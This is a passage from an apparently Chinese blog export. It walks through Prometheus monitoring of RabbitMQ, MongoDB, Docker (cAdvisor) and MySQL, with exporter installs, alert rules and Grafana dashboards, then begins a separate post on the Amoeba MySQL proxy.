severity: critical annotations: summary: &quot;RabbitMQ_socket连接数使用过高,实例:{{ $labels.instance }}&quot; description: 'RabbitMQ_sockets使用&gt;60%,当前值为：{{ $value }}' - alert: RabbitMQ文件描述符使用过高告警 expr: rabbitmq_fd_used / rabbitmq_fd_available * 100 &gt; 60 for: 0m labels: severity: critical annotations: summary: &quot;RabbitMQ文件描述符使用过高,实例:{{ $labels.instance }}&quot; description: 'RabbitMQ文件描述符使用&gt;60%,当前值为：{{ $value }}' EOF 检查配置 1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 1http://192.168.224.11:9090/alerts?search= 8、dashboardgrafana展示prometheus从rabbitmq_exporter收集到的的数据 id: 4279 1https://grafana.com/grafana/dashboards/4279-rabbitmq-monitoring/ 五、监控mongodb1、创建监控⽤户登陆mongodb创建监控⽤户，权限为“readAnyDatabase”，如果是cluster环境，需要有权限“clusterMonitor” 登录mongodb（docker安装的mongo） 1docker exec -it mongo mongo admin 登录mongodb（yum和apt安装的mongo） 1mongo admin 创建监控用户 12345678&gt; db.auth('root','123456')1&gt; db.createUser({ user:'exporter',pwd:'password',roles:[ { role:'readAnyDatabase', db: 'admin'},{ role: &quot;clusterMonitor&quot;, db: &quot;admin&quot; }]});#测试 使⽤上⾯创建的⽤户信息进⾏连接。&gt; db.auth('exporter', 'password')1#表示成功&gt; exit 2、二进制安装mongodb_expotermongodb_exporter地址 123https://github.com/percona/mongodb_exporter/releases或者https://github.com/prometheus/mysqld_exporter/releases 下载⼆进制包解压并放⼊**/usr/local/Prometheus**⽬录 12345wget https://github.com/percona/mongodb_exporter/releases/download/v0.37.0/mongodb_exporter-0.37.0.linux-amd64.tar.gztar xzf mongodb_exporter-0.37.0.linux-amd64.tar.gzmv mongodb_exporter-0.37.0.linux-amd64 /usr/local/Prometheus/mongodb_exporter 更改exporter⽂件夹权限 1chown prometheus.prometheus -R /usr/local/Prometheus/ 创建 systemd 服务 mongodb_exporter.service 1234567891011121314cat &lt;&lt;EOF &gt;/usr/lib/systemd/system/mongodb_exporter.service[Unit]Description=mongodb_exporterDocumentation=https://github.com/percona/mongodb_exporterAfter=network.target[Service]Type=simpleUser=prometheusEnvironment=&quot;MONGODB_URI=mongodb://exporter:password@localhost:27017/admin&quot;ExecStart=/usr/local/Prometheus/mongodb_exporter/mongodb_exporter --log.level=error --collect-all --compatible-modeRestart=on-failure[Install]WantedBy=multi-user.targetEOF 启动 mongodb_exporter 1234systemctl daemon-reloadsystemctl start mongodb_exporter.servicesystemctl enable mongodb_exporter.servicesystemctl status mongodb_exporter.service 启动不了检查⽇志 1journalctl -u mongodb_exporter.service -f 3、docker安装mongodb_exporterdocker直接运⾏ 1docker run -d --restart=always -p 9216:9216 -p 17001:17001 --restart=always --name=mongodb-exporter bitnami/mongodb-exporter:latest --collect-all --compatible-mode --mongodb.uri=mongodb://exporter:password@192.168.224.12:27017/admin?ssl=false docker-compose⽅式 1cd /data/mongo/ 123456789101112131415cat &gt;docker-compose.yaml &lt;&lt;EOFversion: '3.3'services: mongodb_exporter: image: bitnami/mongodb-exporter:latest container_name: mongodb_exporter restart: always environment: MONGODB_URI: &quot;mongodb://exporter:password@192.168.224.12:27017/admin?ssl=false&quot; command: - '--collect-all' - '--compatible-mode' ports: - &quot;9216:9216&quot;EOF 启动 1docker-compose up -d 检查 1docker ps -a 4、参数解释 Flag 含义 案例 -h, –help 显示上下⽂相关的帮助 –[no-]compatible-mode 启⽤旧的 mongodb exporter 兼容指标 –[no-]discovering-mode 启⽤⾃动发现集合 –mongodb.collstats-colls 逗号分隔的databases.collections列表以获取 $collStats –mongodb.collstats-colls=db1,db2.col2 –mongodb.indexstats-colls 逗号分隔的databases.collections列表以获取$indexStats –mongodb.indexstats-colls=db1.col1,db2.col2 –[no-]mongodb.direct-connect 是否应该进⾏直接连接。如果指定了多个主机或使⽤了 SRVURI，则直接连接⽆效 –[no-]mongodb.global-connpool 使⽤全局连接池⽽不是为每个http请求创建新池 –mongodb.uri MongoDB 连接 URI($MONGODB_URI) –smongodb.uri=mongodb://user:pass@127.0.0.1:27017/admin? –web.listen-address ⽤于侦听 Web 界⾯和遥测的地址 –web.listen-address=”:9216” –web.telemetry-path 指标公开路径 –web.telemetry-path=”/metrics” –web.config 具有⽤于基本身份验证的 Prometheus TLS配置的⽂件的路径 –web.config=STRING –log.level 仅记录具有给定严重性或更⾼严重性的消息。有效级别：[调试、信息、警告、错误、致命] –log.level=”erro –collector.diagnosticdata 启⽤从getDiagnosticData收集指标 –collector.replicasetstatus 启⽤从replSetGetStatus 收集指标 –collector.dbstats 启⽤从 dbStats 收集指标 –collector.topmetrics 启⽤从 top admincommand 收集指标 –collector.indexstats 启⽤从 $indexStats收集指标 –collector.collstats 启⽤从 $collStats 收集指标 –collect-all 启⽤所有收集器。与指定所有 –collector.相同 –collector.collstats-limit=0 如果有超过 个集合，请禁⽤ collstats、dbstats、topmetrics和 indexstats 收集器。0=⽆限制 --metrics.overridedescendingindex 启⽤降序索引名称覆盖以将 -1 替换为_DESC –version 显示版本并退出 5、metrics地址注：安装好Exporter后会暴露⼀个 http://ip:端⼝/metrics 的HTTP服务 名称 地址 rabbitmq_exporter http://192.168.224.12:9216/metrics 6、Prometheus配置配置prometheus去采集（拉取）mongodb_exporter的监控样本数据 12345678910cd /data/docker-prometheus#在scrape_configs(搜刮配置):下⾯增加如下配置：cat &gt;&gt; prometheus/prometheus.yml &lt;&lt; &quot;EOF&quot; - job_name: 'mongodb_exporter' static_configs: - targets: ['192.168.224.12:9216'] labels: instance: server2.com服务器EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 7、常⽤的监控指标1234567891011121314151617181920212223242526272829303132333435mongodb_ss_connections{conn_type=&quot;available&quot;} 可⽤的连接总数mongodb_ss_mem_virtualmongodb_ss_mem_resident# 关于 server statusmongodb_up # 服务器是否在线mongodb_ss_ok{cl_id=&quot;&quot;, cl_role=&quot;mongod&quot;, rs_state=&quot;0&quot;} # 服务器是否正常运⾏，取值为 1、0 。标签中记录了 Cluster、ReplicaSet 的信息mongodb_ss_uptime # 服务器的运⾏时⻓，单位为秒mongodb_ss_connections{conn_type=&quot;current&quot;} # 客户端连接数# 关于主机mongodb_sys_cpu_num_cpus # 主机的 CPU 核数# 关于 collectionmongodb_collstats_storageStats_count{database=&quot;xx&quot;, collection=&quot;xx&quot;} # collection 全部⽂档的数量mongodb_collstats_storageStats_size # collection 全部⽂档的体积，单位 bytesmongodb_collstats_storageStats_storageSize # collection 全部⽂档占⽤的磁盘空间，默认会压缩delta(mongodb_collstats_latencyStats_reads_ops[1m]) # collection 读操作的数量（每分钟）delta(mongodb_collstats_latencyStats_reads_latency[1m]) # collection 读操作的延迟（每分钟），单位为微秒mongodb_collstats_latencyStats_write_opsmongodb_collstats_latencyStats_write_latency# 关于 indexmongodb_collstats_storageStats_nindexes # collection 的 index 数量mongodb_collstats_storageStats_totalIndexSize # collection 的 index 占⽤的磁盘空间delta(mongodb_indexstats_accesses_ops[1m]) # index 被访问次数# 关于操作delta(mongodb_ss_opcounters[1m]) # 执⾏各种操作的数量delta(mongodb_ss_opLatencies_latency[1m]) # 执⾏各种操作的延迟，单位为微秒delta(mongodb_ss_metrics_document[1m]) # 各种⽂档的变化数量# 关于锁delta(mongodb_ss_locks_acquireCount{lock_mode=&quot;w&quot;}[1m]) # 新加锁的数量。R 表示共享锁，W 表示独占锁，r表示意向共享锁，w 表示意向独占锁mongodb_ss_globalLock_currentQueue{count_type=&quot;total&quot;} # 被锁阻塞的操作数 8、触发器配置mongodb触发器（告警规则） 因mongo单点，所以未配置复制触发器 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748cat &gt;&gt; prometheus/rules/mongodb.yml &lt;&lt;&quot;EOF&quot;groups:- name: PerconaMongodbExporter rules: - alert: MongodbDown expr: 'mongodb_up == 0' for: 0m labels: severity: critical annotations: summary: &quot;MongoDB Down 容器: $labels.instance&quot; description: &quot;MongoDB 容器 is down, 当前值:{{ $value }}&quot; - alert: MongodbNumberCursorsOpen expr: 'mongodb_ss_metrics_cursor_open{csr_type=&quot;total&quot;} &gt; 10 * 1000' for: 2m labels: severity: warning annotations: summary: &quot;MongoDB 数字有标打开告警 容器: $labels.instance&quot; description: &quot;MongoDB 为客户端打开的游标过多 &gt; 10k, 当前值:{{ $value }}&quot; - alert: MongodbCursorsTimeouts expr: 'increase(mongodb_ss_metrics_cursor_timedOut[1m]) &gt; 100' for: 2m labels: severity: warning annotations: summary: &quot;MongoDB 游标超时 容器: $labels.instance&quot; description: &quot;太多游标超时, 当前值:{{ $value }}&quot; - alert: MongodbTooManyConnections expr: 'avg by(instance) (rate(mongodb_ss_connections{conn_type=&quot;current&quot;}[1m])) / avg by(instance) (sum (mongodb_ss_connections) by (instance)) * 100 &gt; 80' for: 2m labels: severity: warning annotations: summary: &quot;MongoDB 太多连接 容器: $labels.instance&quot; description: &quot;MongoDB 连接数 &gt; 80%, 当前值:{{ $value }}&quot; - alert: MongodbVirtualMemoryUsage expr: '(sum(mongodb_ss_mem_virtual) BY (instance) / sum(mongodb_ss_mem_resident) BY (instance)) &gt; 3' for: 2m labels: severity: warning annotations: summary: &quot;MongoDB虚拟内存使用告警 容器: $labels.instance&quot; description: &quot;虚拟内存使用过高, 当前值:{{ $value }}&quot;EOF 检查配置 1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 1http://192.168.224.11:9090/alerts?search= 8、dashboardgrafana展示prometheus从mongodb_exporter收集到的的数据 1234https://github.com/percona/grafana-dashboards/tree/main/dashboards/MongoDB下载这个MongoDB_Instances_Overview.json文件导入到grafana 看到有报缺少插件，polystat,可以下载插件 到设置里面的Plugins里面搜索polystat，然后安装 六、监控docker为了能够获取到Docker容器的运⾏状态，⽤户可以通过Docker的stats命令获取到当前主机上运⾏容器的 统计信息，可以查看容器的CPU利⽤率、内存使用量、网络IO总量以及磁盘IO总量等信息。 1docker stats 除了使⽤命令以外，⽤户还可以通过Docker提供的HTTP API查看容器详细的监控统计信息。 1、使⽤CAdvisorCAdvisor是Google开源的⼀款⽤于展示和分析容器运⾏状态的可视化⼯具。通过在主机上运⾏CAdvisor ⽤户可以轻松的获取到当前主机上容器的运⾏统计信息，并以图表的形式向⽤户展示。 docker命令安装 123456789docker run -d \\ --restart=always \\ --volume=/:/rootfs:ro \\ --volume=/var/run:/var/run:rw \\ --volume=/sys:/sys:ro \\ --volume=/var/lib/docker/:/var/lib/docker:ro \\ --publish=8080:8080 \\ --name=cadvisor \\ google/cadvisor:latest Docker-compose安装 12mkdir /data/cadvisorcd /data/cadvisors 通过cat新建docker-compose.yaml⽂件 123456789101112131415cat &gt; docker-compose.yaml &lt;&lt;&quot;EOF&quot;version: '3.3'services: cadvisor: image: google/cadvisor:latest container_name: cadvisor restart: always volumes: - /:/rootfs:ro - /var/run:/var/run:rw - /sys:/sys:ro - /var/lib/docker/:/var/lib/docker:ro ports: - 8080:8080EOF 启动 1234docker-compose up -ddocker ps 通过访问http://192.168.224.12:8080可以查看，当前主机上容器的运⾏状态，如下所示 访问http://192.168.224.12:8080/metrics即可获取到标准的Prometheus监控样本输出 2、Prometheus配置配置prometheus去采集（拉取）cAdvisor的监控样本数据 12345678910cd /data/docker-prometheus#在scrape_configs(搜刮配置):下⾯增加如下配置：cat &gt;&gt; prometheus/prometheus.yml &lt;&lt; &quot;EOF&quot; - job_name: 'cadvisor' scrape_interval: 15s static_configs: - targets: ['192.168.224.12:8080'] labels: instance: server2.com服务器 EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 启动完成后，可以在Prometheus UI中查看到当前所有的Target状态： 1http://192.168.224.11:9090/targets?search= 3、常用监控指标下⾯表格中列举了⼀些CAdvisor中获取到的典型监控指标： 1container_ 指标名称 类型 含义 container_cpu_load_average_10s gauge 过去10秒容器CPU的平均负载 container_cpu_usage_seconds_total counter 容器在每个CPU内核上的累积占⽤时间(单位：秒) container_cpu_system_seconds_total counter System CPU累积占⽤时间（单位：秒） container_cpu_user_seconds_total counter User CPU累积占⽤时间（单位：秒） container_fs_usage_bytes gauge 容器中⽂件系统的使⽤量(单位：字节) container_fs_limit_bytes gauge 容器可以使⽤的⽂件系统总量(单位：字节) container_fs_reads_bytes_total counter 容器累积读取数据的总量(单位：字节) container_fs_writes_bytes_total counter 容器累积写⼊数据的总量(单位：字节) container_memory_max_usage_bytes gauge 容器的最⼤内存使⽤量（单位：字节） container_memory_usage_bytes gauge 容器当前的内存使⽤量（单位：字节 container_spec_memory_limit_bytes gauge 容器的内存使⽤量限制 machine_memory_bytes gauge 当前主机的内存总量 container_network_receive_bytes_total counter 容器⽹络累积接收数据总量（单位：字节） container_network_transmit_bytes_total counter 容器⽹络累积传输数据总量（单位：字 4、触发器配置Prometheus配置 添加docker触发器（告警规则） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354cat &gt;&gt; prometheus/rules/docker.yml &lt;&lt;&quot;EOF&quot;groups:- name: DockerContainers rules: - alert: ContainerKilled expr: time() - container_last_seen &gt; 60 for: 0m labels: severity: warning annotations: isummary: &quot;Docker容器被杀死 容器: $labels.instance&quot; description: &quot;{{ $value }}个容器消失了&quot; # This rule can be very noisy in dynamic infra with legitimate container start/stop/deployment. - alert: ContainerAbsent expr: absent(container_last_seen) for: 5m labels: severity: warning annotations: summary: &quot;无容器 容器: $labels.instance&quot; description: &quot;5分钟检查容器不存在，值为：{{ $value }}&quot; - alert: ContainerCpuUsage expr: (sum(rate(container_cpu_usage_seconds_total{name!=&quot;&quot;}[3m])) BY (instance, name) * 100) &gt; 300 for: 2m labels: severity: warning annotations: summary: &quot;容器cpu使用率告警 容器: $labels.instance&quot; description: &quot;容器cpu使用率超过300%，当前值为：{{ $value }}&quot; - alert: ContainerMemoryUsage expr: (sum(container_memory_working_set_bytes{name!=&quot;&quot;}) BY (instance, name) / sum(container_spec_memory_limit_bytes &gt; 0) BY (instance, name) * 100) &gt; 80 for: 2m labels: severity: warning annotations: summary: &quot;容器内存使用率告警 容器: $labels.instance&quot; description: &quot;容器内存使用率超过80%，当前值为：{{ $value }}&quot; - alert: ContainerVolumeIoUsage expr: (sum(container_fs_io_current{name!=&quot;&quot;}) BY (instance, name) * 100) &gt; 80 for: 2m labels: severity: warning annotations: summary: &quot;容器存储io使用率告警 容器: $labels.instance&quot; description: &quot;容器存储io使用率超过 80%，当前值为：{{ $value }}&quot; - alert: ContainerHighThrottleRate expr: rate(container_cpu_cfs_throttled_seconds_total[3m]) &gt; 1 for: 2m labels: severity: warning annotations: summary: &quot;容器限制告警 容器: $labels.instance&quot; description: &quot;容器被限制，当前值为：{{ $value }}&quot;EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 5、dashboardgrafana展示prometheus收集到的cadvisor的数据 123https://grafana.com/grafana/dashboards/11600-docker-container/id 11600 七、监控mysql使⽤docker-compose安装mysql，当然也可以⾃⾏安装 docker-compose安装mysql 12mkdir /data/mysql -pcd /data/mysql 通过cat创建docker-compose.yaml文件 12345678910111213141516171819202122232425cat &gt; docker-compose.yaml &lt;&lt;&quot;EOF&quot;version: '3.1'services: db: image: mysql restart: always container_name: mysql environment: TZ: Asia/Shanghai LANG: en_US.UTF-8 MYSQL_ROOT_PASSWORD: 123456 command: --default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4 --collation-server=utf8mb4_general_ci --lower_case_table_names=1 --performance_schema=1 --sql-mode=&quot;&quot; --skip-log-bin volumes: #- /data/mysql/conf:/etc/mysql/conf.d #数据文件挂载 - /data/mysql/data:/var/lib/mysql #数据文件挂载 ports: - 3306:3306EOF 运⾏ 1docker-compose up -d 检查 1docker ps -a STATUS列全部为up 为正常 1、监控mysqlmysqld_exporter 1、创建⽤户 登录mysql 123docker exec -it mysql mysql -uroot -p输⼊密码：12345 创建 12mysql&gt; CREATE USER 'exporter'@'%' IDENTIFIED BY 'password' WITH MAX_USER_CONNECTIONS 3;mysql&gt; GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO 'exporter'@'%'; 验证 1docker exec -it mysql mysql -uexporter -p 2、⼆进制安装（⼆选⼀）1下载地址：https://github.com/prometheus/mysqld_exporter/releases 下载解压后移动**/usr/local/Prometheus**⽬录 12345wget https://github.com/prometheus/mysqld_exporter/releases/download/v0.14.0/mysqld_exporter-0.14.0.freebsd-amd64.tar.gztar zxf mysqld_exporter-0.14.0.freebsd-amd64.tar.gzmv mysqld_exporter-0.14.0.freebsd-amd64 /usr/local/Prometheus/mysqld_exporter 更改exporter⽂件夹权限 1chown prometheus.prometheus -R /usr/local/Prometheus/ 创建连接数据库的⽂件 1234567cat &gt;/usr/local/Prometheus/mysqld_exporter/.mysqld_exporter.cnf &lt;&lt; &quot;EOF&quot;[client]user=exporterpassword=passwordhost=192.168.224.12port=3306EOF 创建systemd服务 123456789101112131415161718192021222324252627282930313233cat &gt; /etc/systemd/system/mysqld_exporter.service &lt;&lt; &quot;EOF&quot;[Unit]Description=Prometheus MySQL ExporterAfter=network.target[Service]Type=simpleUser=prometheusGroup=prometheusRestart=alwaysExecStart=/usr/local/Prometheus/mysqld_exporter/mysqld_exporter \\--config.my-cnf=/usr/local/Prometheus/mysqld_exporter/.mysqld_exporter.cnf \\--collect.global_status \\--collect.auto_increment.columns \\--collect.info_schema.processlist \\--collect.binlog_size \\--collect.info_schema.tablestats \\--collect.global_variables \\--collect.info_schema.innodb_metrics \\--collect.info_schema.query_response_time \\--collect.info_schema.userstats \\--collect.info_schema.tables \\--collect.perf_schema.tablelocks \\--collect.perf_schema.file_events \\--collect.perf_schema.eventswaits \\--collect.perf_schema.indexiowaits \\--collect.perf_schema.tableiowaits \\--collect.slave_status \\--web.listen-address=0.0.0.0:9104[Install]WantedBy=multi-user.targetEOF 启动 mysqld_exporter 1234567systemctl daemon-reloadsystemctl start mysqld_exportersystemctl enable mysqld_exportersystemctl status mysqld_exporter启动不了检查⽇志journalctl -u mysqld_exporter -f 3、docker安装docker-compose运⾏ 12345678910111213141516171819202122mkdir /data/mysqld_exporter -pcd /data/mysqld_exportercat &gt;docker-compose.yaml&lt;&lt;&quot;EOF&quot;version: '3.3'services: mysqld-exporter: image: prom/mysqld-exporter container_name: mysqld-exporter restart: always command: - '--collect.info_schema.processlist' - '--collect.info_schema.innodb_metrics' - '--collect.info_schema.tablestats' - '--collect.info_schema.tables' - '--collect.info_schema.userstats' - '--collect.engine_innodb_status' environment: - DATA_SOURCE_NAME=exporter:password@(192.168.224.12:3306)/ ports: - 9104:9104EOF 启动 1234docker-compose up -d检查docker ps -a 4、参数解释 Name MySQL Version Description collect.auto_increment.columns 5.1 从 information_schema 收集 auto_increment 列和最⼤值. collect.binlog_size 5.1 收集所有注册的binlog⽂件的当前⼤⼩ collect.engine_innodb_status 5.1 收集SHOW ENGINE INNODB STATUS collect.engine_tokudb_status 5.6 收集SHOW ENGINE TOKUDB STATUS . collect.global_status 5.1 收集SHOW GLOBAL STATUS（默认启⽤) collect.global_variables 5.1 收集SHOW GLOBAL VARIABLES（默认启⽤） collect.info_schema.clientstats 5.5 如果以 userstat=1 运⾏，设置为 true 以收集客户端统计信息 collect.info_schema.innodb_metrics 5.6 从 information_schema.innodb_metrics收集指标 collect.info_schema.innodb_tablespaces 5.7 从information_schema.innodb_sys_tablespaces收集指标 collect.info_schema.innodb_cmp 5.5 从information_schema.innodb_cmp收集 InnoDB 压缩表指标。 collect.info_schema.innodb_cmpmem 5.5 从information_schema.innodb_cmpmem缓冲池压缩指标。 collect.info_schema.processlist 5.1 从 information_schema.processlist 收集线程状态计数 collect.info_schema.processlist.min_time 5.1 线程必须处于要计算的每个状态的最短时间。 （默认值：0） collect.info_schema.query_response_time 5.5 如果 query_response_time_stats 为 ON，则收集查询响应时间分布。 collect.info_schema.replica_host 5.6 从 information_schema.replica_host_status 收集指标。 collect.info_schema.tables 5.1 从information_schema.tables收集指标。 collect.info_schema.tables.databases 5.1 要为其收集表统计信息的数据库列表，或为所有 collect.info_schema.tablestats 5.1 如果以 userstat=1 运⾏，设置为 true 以收集表统计信息。 collect.info_schema.schemastats 5.1 如果以 userstat=1 运⾏，设置为 true 以收集架构统计信息 collect.info_schema.userstats 5.1 如果以 userstat=1 运⾏，设置为 true 以收集⽤户统计信息。 collect.mysql.user 5.5 从 mysql.user 表中收集数据 collect.perf_schema.eventsstatements 5.6 从 performance_schema.events_statements_summary_by_digest 收集指标。 collect.perf_schema.eventsstatements.digest_text_limit 5.6 规范化语句⽂本的最⼤⻓度。 （默认值：120） collect.perf_schema.eventsstatements.limit 5.6 按响应时间限制事件语句摘要的数量。 （默认值：250） collect.perf_schema.eventsstatements.timelimit 5.6 以秒为单位限制“last_seen”事件语句的存在时间。 （默认值：86400） collect.perf_schema.eventsstatementssum 5.7 从 performance_schema.events_statements_summary_by_digest 汇总收集指标。 collect.perf_schema.eventswaits 5.5 从performance_schema.events_waits_summary_global_by_event_name收集指标 collect.perf_schema.file_events 5.6 从 performance_schema.file_summary_by_event_name 收集指标 collect.perf_schema.file_instances 5.5 从 performance_schema.file_summary_by_instance 收集指标。 collect.perf_schema.file_instances.remove_prefix 5.5 删除 performance_schema.file_summary_by_instance 中的路径前缀。 collect.perf_schema.indexiowaits 5.6 从 performance_schema.table_io_waits_summary_by_index_usage收集指标。 collect.perf_schema.memory_events 5.7 从 performance_schema.memory_summary_global_by_event_name收集指标。 collect.perf_schema.memory_events.remove_prefix 5.7 删除performance_schema.memory_summary_global_by_event_name 中的仪器前缀 collect.perf_schema.tableiowaits 5.6 从 performance_schema.table_io_waits_summary_by_table 收集指标 collect.perf_schema.tablelocks 5.6 从 performance_schema.table_lock_waits_summary_by_table 收集指标 collect.perf_schema.replication_group_members 5.7 从 performance_schema.replication_group_members 收集指标 collect.perf_schema.replication_group_member_stats 5.7 从 performance_schema.replication_group_member_stats 收集指标 collect.perf_schema.replication_applier_status_by_worker 5.7 从 performance_schema.replication_applier_status_by_worker 收集指标 collect.slave_status 5.1 从 SHOW SLAVE STATUS 收集（默认启⽤） collect.slave_hosts 5.1 从 SHOW SLAVE HOSTS 收集 collect.heartbeat 5.1 从⼼跳收集 collect.heartbeat.database 5.1 从哪⾥收集⼼跳数据的数据库。 （默认：⼼跳） collect.heartbeat.table 5.1 从哪⾥收集⼼跳数据的表。 （默认：⼼跳） collect.heartbeat.utc 5.1 使⽤ UTC 作为当前服务器的时间戳（使⽤ –utc 调⽤ pt-heartbeat ）。 （默认值：假） 5、Prometheus配置配置prometheus去采集（拉取）mysql_exporter的监控样本数据 12345678910cd /data/docker-prometheus#在scrape_configs(搜刮配置):下⾯增加如下配置：cat &gt;&gt; prometheus/prometheus.yml &lt;&lt; &quot;EOF&quot; - job_name: 'mysqld_exporter' static_configs: - targets: ['192.168.224.12:9104'] labels: instance: server2.com服务器EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 6、常用监控指标1234567891011121314151617181920212223242526mysql_up # 服务器是否在线mysql_global_status_uptime # 运行时长，单位 sdelta(mysql_global_status_bytes_received[1m]) # 网络接收的 bytesdelta(mysql_global_status_bytes_sent[1m]) # 网络发送的 bytesmysql_global_status_threads_connected # 当前的客户端连接数mysql_global_variables_max_connections # 允许的最大连接数mysql_global_status_threads_running # 正在执行命令的客户端连接数，即非 sleep 状态delta(mysql_global_status_aborted_connects[1m]) # 客户端建立连接失败的连接数，比如登录失败delta(mysql_global_status_aborted_clients[1m]) # 客户端连接之后，未正常关闭的连接数delta(mysql_global_status_commands_total{command=&quot;xx&quot;}[1m]) &gt; 0 # 每分钟各种命令的次数delta(mysql_global_status_handlers_total{handler=&quot;xx&quot;}[1m]) &gt; 0 # 每分钟各种操作的次数delta(mysql_global_status_handlers_total{handler=&quot;commit&quot;}[1m]) &gt; 0 # 每分钟 commit 的次数delta(mysql_global_status_table_locks_immediate[1m]) # 请求获取锁，且立即获得的请求数delta(mysql_global_status_table_locks_waited[1m]) # 请求获取锁，但需要等待的请求数。该值越少越好delta(mysql_global_status_queries[1m]) # 每分钟的查询数delta(mysql_global_status_slow_queries[1m]) # 慢查询数。如果未启用慢查询日志，则为 0mysql_global_status_innodb_page_size # innodb 数据页的大小，单位 bytesmysql_global_variables_innodb_buffer_pool_size # innodb_buffer_pool 的限制体积mysql_global_status_buffer_pool_pages{state=&quot;data&quot;} # 包含数据的数据页数，包括洁页、脏页mysql_global_status_buffer_pool_dirty_pages # 脏页数 7、触发器配置添加mysql触发器（告警规则） 1cd /data/docker-prometheus 使⽤cat创建⽂件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354cat &gt;&gt; prometheus/rules/mysqld.yml &lt;&lt;&quot;EOF&quot;groups:- name: MySQL rules: - alert: MysqlDown expr: mysql_up == 0 for: 30s labels: severity: critical annotations: summary: &quot;MySQL Down,实例:{{ $labels.instance }}&quot; description: &quot;MySQL_exporter连不上MySQL了，当前状态为：{{ $value }}&quot; - alert: MysqlTooManyConnections expr: max_over_time(mysql_global_status_threads_connected[1m]) / mysql_global_variables_max_connections * 100 &gt; 80 for: 2m labels: severity: warning annotations: summary: &quot;Mysql连接数过多告警,实例:{{ $labels.instance }}&quot; description: &quot;MySQL连接数&gt;80%,当前值：{{ $value }}&quot; - alert: MysqlHighThreadsRunning expr: max_over_time(mysql_global_status_threads_running[1m]) &gt; 20 for: 2m labels: severity: warning annotations: summary: &quot;Mysql运行的线程过多,实例:{{ $labels.instance }}&quot; description: &quot;Mysql运行的线程 &gt; 20，当前运行的线程：{{ $value }}&quot; - alert: MysqlSlowQueries expr: increase(mysql_global_status_slow_queries[2m]) &gt; 0 for: 2m labels: severity: warning annotations: summary: &quot;Mysql慢日志告警,实例:{{ $labels.instance }}&quot; description: &quot;MySQL在过去2分钟有新的{{ $value }}条慢查询&quot; #MySQL innodb 日志写入停滞 - alert: MysqlInnodbLogWaits expr: rate(mysql_global_status_innodb_log_waits[15m]) &gt; 10 for: 0m labels: severity: warning annotations: summary: &quot;MySQL innodb日志等待,实例:{{ $labels.instance }}&quot; description: &quot;MySQL innodb日志写入停滞，当前值： {{ $value }}&quot; - alert: MysqlRestarted expr: mysql_global_status_uptime &lt; 60 for: 0m labels: severity: info annotations: summary: &quot;MySQL 重启,实例:{{ $labels.instance }}&quot; description: &quot;不到一分钟前，MySQL重启过&quot;EOF 配置检查 1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 1http://192.168.224.11:9090/alerts?search= 8、dashboardgrafana展示prometheus从mysql_exporter收集到的的数据 123https://grafana.com/grafana/dashboards/7362https://github.com/percona/grafana-dashboards/tree/main/dashboards/MySQL Top Process States和 Process States图形修改为如下： mysql_info_schema_threads 替换成： mysql_info_schema_processlist_threads 数据库表监控 1https://grafana.com/grafana/dashboards/9625 注意：2个图表没有数据，是因为只⽀持percona server 和 mariadb","link":"/2023/05/07/Prometheus%E7%9B%91%E6%8E%A7nginx,redis,mysql%E7%AD%89/"},{"title":"amoeba代理","text":"Mysql代理软件AmoebaAmoeba的作用是在于Mysql之上，用于代理应用与Mysql的连接，可以理解为中间件，他的作用是将连接细化，如：将读写进行分离，分别指向不同的数据库，也可用根据不同的数据进行指向不同的数据库，还可以做读或写的负载均衡 mysql 代理层有mysqlproxy, amoeba, cobar等 Mysqlproxy：数据量很小的时候用的还不错，可数据量一但大起来，这个软件就会暴露出很多BUG问题，Mysql官方给出的建议是适应轻量级的应用 ​ Amoeba：适用中大型数据量的应用负载，可做读写分离，数据切分，负载均衡等技术，是目前企业中用的最广的数据库代理 ​ Cobar：Cobar的分布式主要是通过将表放入不同的库来实现。是阿里巴巴开发的软件，本地的软件和Amoeba一样 Amoeba代理Mysql读写分离 Amoeba代理Mysql读写分离，架构图： 123456789101112 客户 ｜ ｜ web应用程序，游戏程序（c,php,java.......)客户端 | | 代理层 (mysqlproxy,amoeba) 读写分离/数据切分 | | mysql主 &lt;----&gt; mysql从 准备4台服务器(3台也行，amoeba当代理又当客户端) 192.168.224.10 客户端 192.168.224.11 amoeba 192.168.224.12 mysql主 192.168.224.13 mysql从 123456-u 指定用户名-p 指定用户密码-h 指定服务器IP-S 指定socket文件路径-P 指定mysql服务器的端口号-e 不登录MySQL，进行操作。 架构前所有节点准备： 1，主机名三步，互相绑定 2，时间同步 3，关闭iptables,selinux 4, 配置好yum 5, 静态ip地址 6,安装好mysql 第一步：安装amoeba服务器在amoeba服务器上操作。 因为是java开发的，需要java运行环境，需要先安装JDK 1、安装jdk1.8版本， tar包二进制包，解压即能用。 本地上传 1tar xf jdk-8u45-linux-x64.tar.gz -C /usr/local/ 把刚解压的JDK改名为java 1mv /usr/local/jdk1.8.0_45 /usr/local/java 验证一下刚解压安装的的jdk版本 12345/usr/local/java/bin/java -version java version &quot;1.8.0_45&quot;Java(TM) SE Runtime Environment (build 1.8.0_45-b14)Java HotSpot(TM) 64-Bit Server VM (build 25.45-b02, mixed mode) 到此为止JDK已经好了，下面amoeba要用到这个jdk目录 2、安装amoeba软件 官网 1https://sourceforge.net/projects/amoeba/ 下载amoeba 1234wget https://nchc.dl.sourceforge.net/project/amoeba/Amoeba%20for%20mysql/3.x/amoeba-mysql-3.0.5-RC-distribution.zipunzip amoeba-mysql-3.0.5-RC-distribution.zip -d /usr/local/ mv /usr/local/amoeba-mysql-3.0.5-RC/ /usr/local/amoeba 使用ls查看解压的目录 123ls /usr/local/amoeba/benchmark bin conf jvm.properties lib 关注下面二个目录 bin 是启动脚本目录 conf 是配置文件目录 ​ 配置文件目录里我们要关注有三个文件: ​ amoeba.xml 